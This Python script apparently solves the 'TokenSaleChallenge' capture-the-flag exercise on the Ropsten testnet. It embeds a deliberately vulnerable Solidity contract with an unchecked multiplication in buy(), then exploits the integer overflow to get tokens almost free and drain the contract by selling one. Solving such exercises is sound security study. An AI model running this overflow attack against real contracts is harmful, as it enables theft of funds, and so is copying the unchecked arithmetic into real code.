from solcx import compile_source
from helper import get_provider_and_account
from eth_utils import to_int
w3, acct = get_provider_and_account()

# solidity source code of target
compiled_target = compile_source(
"""
pragma solidity ^0.4.21;

contract TokenSaleChallenge {
    mapping(address => uint256) public balanceOf;
    uint256 constant PRICE_PER_TOKEN = 1 ether;

    function TokenSaleChallenge(address _player) public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance < 1 ether;
    }

    function buy(uint256 numTokens) public payable {
        require(msg.value == numTokens * PRICE_PER_TOKEN);

        balanceOf[msg.sender] += numTokens;
    }

    function sell(uint256 numTokens) public {
        require(balanceOf[msg.sender] >= numTokens);

        balanceOf[msg.sender] -= numTokens;
        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);
    }
}
"""
)

contract_id, contract_interface = compiled_target.popitem()

# get abi
abi = contract_interface["abi"]

token_sale = w3.eth.contract(
    address="0x0E115CE09EAa8BCFd461E700254b1834c8E2a406",
    abi=abi
)    

max_uint = 2 ** 256 - 1
purchase_amount = max_uint // 10 ** 18 + 1 # divide by 1 ether, add 1 to overflow
wei_amount = purchase_amount * 10 ** 18 - max_uint - 1 # calculate overflow value from numTokens * PRICE_PER_TOKEN 

# send exploit
tx_hash = token_sale.functions.buy(purchase_amount).transact({'value' : wei_amount})
print(f"View on Etherscan: https://ropsten.etherscan.io/tx/{tx_hash.hex()}")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

tx_hash = token_sale.functions.sell(1).transact()
print(f"View on Etherscan: https://ropsten.etherscan.io/tx/{tx_hash.hex()}")
tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)

print(f"Completed: {token_sale.functions.isComplete().call()}")